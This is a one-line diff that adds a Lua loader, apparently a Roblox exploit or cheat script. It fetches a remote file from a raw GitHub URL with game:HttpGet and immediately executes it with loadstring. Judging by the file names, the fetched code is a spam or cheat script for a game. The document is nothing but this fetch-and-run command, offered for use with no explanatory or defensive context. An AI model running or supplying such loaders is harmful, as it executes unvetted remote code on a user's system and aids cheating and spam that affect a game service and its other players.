@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/bloodlines-spam7-a0bl7pywjpgiuy.lua"))()
